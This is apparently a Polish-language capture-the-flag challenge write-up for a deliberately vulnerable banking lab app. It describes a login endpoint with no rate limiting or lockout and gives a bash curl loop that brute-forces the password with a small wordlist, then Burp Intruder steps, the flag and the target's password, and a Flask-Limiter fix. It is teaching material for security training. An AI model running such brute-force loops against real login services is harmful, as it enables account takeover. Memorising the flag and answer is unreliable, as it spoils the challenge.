# A07 — Authentication Failures (Brute-force)

## Metadane
- **ID:** A07
- **Kategoria:** OWASP A07:2025 - Authentication Failures
- **Trudność:** easy
- **Punkty:** 100
- **Flaga:** `PWR{no_ratelimit_bruteforce}` — w profilu boba po zalogowaniu

## Opis
Endpoint `/api/auth/login` nie ma:
- Rate limitingu (możliwe tysiące prób na sekundę)
- Blokady konta po N nieudanych próbach
- CAPTCHA

Bob używa słabego hasła (`password123`) które jest w każdej wordliście.

## Exploit — curl + pętla bash

```bash
# Wordlista top 100
PASSWORDS=(
  "123456" "password" "12345678" "qwerty" "123456789"
  "12345" "1234" "111111" "1234567" "dragon"
  "123123" "baseball" "iloveyou" "monkey" "letmein"
  "696969" "shadow" "master" "666666" "qwertyuiop"
  "123321" "mustang" "password1" "qwerty123" "password123"
)

for PASS in "${PASSWORDS[@]}"; do
  RESULT=$(curl -s -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"bob@vulnbank.pl\",\"password\":\"$PASS\"}")
  if echo "$RESULT" | grep -q "token"; then
    echo "[+] ZNALEZIONO HASŁO: $PASS"
    echo "$RESULT"
    break
  fi
done
```

## Exploit — Burp Suite Intruder
1. Przechwyć POST /api/auth/login
2. Wyślij do Intrudera
3. Zaznacz pole `password` jako punkt wstrzyknięcia
4. Wczytaj wordlistę rockyou.txt (top 100)
5. Start Attack
6. Filtruj po statusie 200

## Jak to naprawić
```python
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@auth_bp.route("/login", methods=["POST"])
@limiter.limit("5 per minute")
def login():
    ...
```

## Referencje
- OWASP A07:2025 - Authentication Failures
- [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html)
